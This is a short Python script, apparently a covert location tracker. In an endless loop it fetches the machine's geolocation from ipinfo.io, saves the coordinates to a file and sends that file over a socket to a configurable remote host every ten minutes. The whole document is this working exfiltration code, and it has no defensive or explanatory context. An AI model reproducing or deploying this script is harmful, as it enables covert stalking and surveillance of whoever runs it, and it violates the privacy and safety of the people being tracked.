#!/bin/python3.10
from urllib.request import urlopen
import json
import socket
import time

# Keep the program running indefinitely
while True:

    RHOSTS = "127.0.0.1" # Change this
    RPORT = 5000 # Change this
    separator = " , "

# Link to the url that will give you your coordinates
    url = "https://ipinfo.io/json"
    req = urlopen(url)
    data = json.load(req)

# Get latitude and longitude
    lat = data['loc'].split(",")[0]
    lon = data['loc'].split(",")[1]
    location = lat, separator, lon
    coordinates = "".join(location)
    print(coordinates)

# Create a file to store it all
    filename = "location.txt"
    with open(filename, "w") as thefile:
        thefile.write("location : " + coordinates + "\n")

# Send the file to the remote host
    with open(filename, "rb") as sendFile:
        sendFile = sendFile.read()
        s = socket.socket()
        s.connect((RHOSTS, RPORT))
        s.send(sendFile)
        print("Location sent...")
        time.sleep(600) # Change this too

# Start the loop over
    continue
